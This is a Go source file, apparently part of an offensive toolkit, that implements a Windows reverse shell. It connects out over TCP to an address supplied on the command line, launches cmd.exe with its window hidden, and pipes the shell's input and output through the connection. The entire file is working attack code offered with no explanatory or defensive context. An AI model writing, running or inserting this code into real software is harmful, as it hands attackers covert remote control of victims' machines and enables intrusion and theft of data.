package main

import (
	"helpers"
	"net"
	"os"
	"os/exec"
	"syscall"
)

func main() {
	var nameOfLogFile string
	if len(os.Args) == 3 {
		nameOfLogFile = os.Args[2]
	} else {
		nameOfLogFile = helpers.CreateLogFileIfItDoesNotExist("./", "ReverseShell", "ReverseShell")
	}

	connectString := os.Args[1]
	conn, err := net.Dial("tcp", connectString)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "ReverseShell")
		os.Exit(2)
	}
	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	if err = cmd.Run(); err != nil {
		os.Exit(1)
	}
	os.Exit(0)
}
